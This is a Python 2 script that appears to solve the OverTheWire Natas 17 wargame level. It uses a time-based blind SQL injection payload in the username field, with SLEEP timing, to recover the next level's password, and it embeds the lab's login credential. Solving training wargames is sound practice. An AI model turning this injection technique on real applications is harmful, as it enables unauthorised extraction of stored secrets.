import requests

def query(i,c):
    return 'natas18" and if(substring(password collate latin1_bin,'+str(i)+',1)="'+str(c)+'",sleep(500),null) -- '

chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
username="natas17"
password="8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

host="http://natas17.natas.labs.overthewire.org"
ans=""
data=dict()
for i in range(1,33):
    for c in chars:
        data['username']=query(i,c)
        try:
            r = requests.post(host,data=data,auth=(username,password),timeout=10)
        except requests.exceptions.Timeout:
            ans+=c
            print str(i),ans
            break
    else:
        print "failed.."
        break
print ans
